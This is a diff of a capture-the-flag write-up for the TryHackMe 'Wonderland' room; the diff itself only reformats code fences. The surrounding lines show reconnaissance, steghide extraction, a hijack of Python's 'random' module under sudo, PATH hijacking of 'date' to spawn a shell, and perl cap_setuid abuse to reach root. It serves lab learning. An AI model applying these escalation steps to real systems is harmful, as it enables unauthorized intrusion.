@@ -7,7 +7,7 @@ These notes are from a challenge I did @[tryhackme](https://tryhackme.com) calle
 Let's scan for open ports first: ```nmap -sC -sV 10.10.28.31```
 
 ??? output "Nmap output"
-    ```txt
+    ``` txt
     Nmap scan report for 10.10.28.31
     Host is up (0.075s latency).
     Not shown: 998 closed ports
@@ -28,7 +28,7 @@ Let's scan for open ports first: ```nmap -sC -sV 10.10.28.31```
 Let's search for paths on the webpage on port 80: ```gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.28.31:80```
 
 ??? output "Gobuster output"
-    ```txt
+    ``` txt
     Gobuster v3.1.0
     by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
     ===============================================================
@@ -57,7 +57,7 @@ Looking at <http://10.10.28.31/img/> we see the following files:
 
 Let's download them all:
 
-```sh
+``` sh
 wget http://10.10.28.31/img/alice_door.jpg
 wget http://10.10.28.31/img/alice_door.png
 wget http://10.10.28.31/img/white_rabbit_1.jpg
@@ -67,7 +67,7 @@ and run steghide...
 
 Unfortunately `alice_door.jpg` and `alice_door.png` don't show any result (at least not without a passphrase...) but `white_rabbit_1.jpg` seems promissing:
 
-```sh
+``` sh
 steghide extract -sf white_rabbit_1.jpg -p ''
 
 the file "hint.txt" does already exist. overwrite ? (y/n) y
@@ -89,7 +89,7 @@ Viewing the HTML code we see:
 Let's try to login using those credentials: `ssh alice@10.10.28.31`
 
 ??? output "ssh login"
-    ```txt
+    ``` txt
     Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 
     * Documentation:  https://help.ubuntu.com
@@ -115,7 +115,7 @@ It is strange to see root.txt in the folder of alice. ```find ./ -type f -iname 
 
 We see `walrus_and_the_carpenter.py` imports and calls `random` to get 10 random lines from the alice in wonderland lyrics stored in the file:
 
-```py
+``` py
 import random
 [...]
 for i in range(10):
@@ -126,7 +126,7 @@ for i in range(10):
 Running `sudo -l` shows we can run `walrus_and_the_carpenter.py` as rabbit:
 
 ??? output "ssh login"
-    ```txt
+    ``` txt
     Matching Defaults entries for alice on wonderland:
         env_reset, mail_badpass,
         secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -137,7 +137,7 @@ Running `sudo -l` shows we can run `walrus_and_the_carpenter.py` as rabbit:
 
 To escalate privileges we can misuse the fact that we can run `walrus_and_the_carpenter.py` by creating our own `random.py` with the following content to overwrite the random function imported and called in `walrus_and_the_carpenter.py`
 
-```py
+``` py
 import os
 
 def choice(argument):
@@ -146,7 +146,7 @@ def choice(argument):
 
 Running `walrus_and_the_carpenter.py` with our `random.py` will now give us prompt as rabbit:
 
-```sh
+``` sh
 sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 ```
 
@@ -154,7 +154,7 @@ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 
 As rabbit we see the following files in home:
 
-```txt
+``` txt
 drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
 drwxr-xr-x 6 root   root    4096 May 25  2020 ..
 lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
@@ -166,7 +166,7 @@ lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
 
 Running teaParty we get the following:
 
-```txt
+``` txt
 rabbit@wonderland:/home/rabbit$ ./teaParty
 Welcome to the tea party!
 The Mad Hatter will be here soon.
@@ -179,7 +179,7 @@ Let's copy `teaParty` to the kali machine and view it in detail with `strings te
 ??? output "strings teaParty"
     Serving teaParty to my kali machine
 
-    ```txt
+    ``` txt
     python3 -m http.server
     Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
     10.9.193.173 - - [21/Oct/2021 19:59:25] "GET /teaParty HTTP/1.1" 200 -
@@ -187,7 +187,7 @@ Let's copy `teaParty` to the kali machine and view it in detail with `strings te
 
     Downloading teaParty file
 
-    ```txt
+    ``` txt
     wget 10.10.28.31:8000/teaParty
     --2021-10-21 15:59:24--  http://10.10.28.31:8000/teaParty
     Connecting to 10.10.28.31:8000... connected.
@@ -202,7 +202,7 @@ Let's copy `teaParty` to the kali machine and view it in detail with `strings te
 
     Run ```strings teaParty```
 
-    ```txt
+    ``` txt
     /lib64/ld-linux-x86-64.so.2
     2U~4
     libc.so.6
@@ -290,7 +290,7 @@ Let's copy `teaParty` to the kali machine and view it in detail with `strings te
 
 We see the program calls `date` in this line: ```/bin/echo -n 'Probably by ' && date --date='next hour' -R```. Just like with "random" from above, let's create our own `date` file e.g.:
 
-```sh
+``` sh
 #!/bin/sh
 bash
 ```
@@ -299,7 +299,7 @@ Now, let's change the file to be executable by everyone: ```chmod +x date``` and
 
 If we now execute `./teaParty` we get a shell as hatter:
 
-```txt
+``` txt
 Welcome to the tea party!
 The Mad Hatter will be here soon.
 Probably by hatter@wonderland:/home/rabbit$
@@ -315,7 +315,7 @@ Since we have the user name and password, let' us login with ssh: ```ssh hatter@
 
 There is another thing we can check: With `getcap -r / 2>/dev/null` we can check for "capabilities" and we see perl in the list:
 
-```txt
+``` txt
 /usr/bin/perl5.26.1 = cap_setuid+ep
 /usr/bin/mtr-packet = cap_net_raw+ep
 /usr/bin/perl = cap_setuid+ep
@@ -329,6 +329,6 @@ Let's run a perl script misusing the capabilities from [GTOBins](https://gtfobin
 
 We are now root and can read the root.txt in the home folder of alice:
 
-```sh
+``` sh
 cat /home/alice/root.txt
 ```
